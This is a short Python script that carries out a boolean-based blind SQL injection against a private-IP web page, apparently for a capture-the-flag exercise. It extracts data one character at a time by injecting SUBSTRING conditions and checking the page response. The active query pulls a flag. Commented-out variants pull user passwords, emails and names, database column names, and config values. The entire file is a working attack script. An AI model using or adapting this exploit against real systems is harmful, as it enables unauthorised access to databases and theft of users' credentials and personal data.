import os
import requests


print("running")

target = "http://10.102.43.198/s3cret_manag3r_pag3.php?name=' OR '1'='1"

test = "Config correctly set"

chars = "abcdefghijklmnopqrstuvwxyz0123456789}{)(-_$£!@."


def check(st):
    r = requests.get(st)
    if test in r.text:
        return True
    else:
        return False


tmp = ""
for j in range(0, 2):
    print("\n\n")

    print(tmp)
    tmp = ""

    for i in range(1,30):
        for char in chars:
            #query = "http://10.102.43.198/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT password FROM users LIMIT {},1),{},1)='{}".format(j, i, char)
            #query = "http://10.102.43.198/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT email FROM users LIMIT {},1),{},1)='{}".format(j, i, char)
            #query = "http://10.102.43.198/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT name FROM users LIMIT {},1),{},1)='{}".format(j, i, char)


            #query = "http://10.102.43.198/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='config' LIMIT {},1),{},1)='{}".format(j, i, char)
            
            
            
            
            query = "http://10.102.43.198/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT flag FROM flag_table LIMIT {},1),{},1)='{}".format(j, i, char)
            #query = "http://10.102.43.198/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT value FROM config LIMIT {},1),{},1)='{}".format(j, i, char)



            



            answer = check(query)
            if answer:
                print(char)
                tmp += char
    




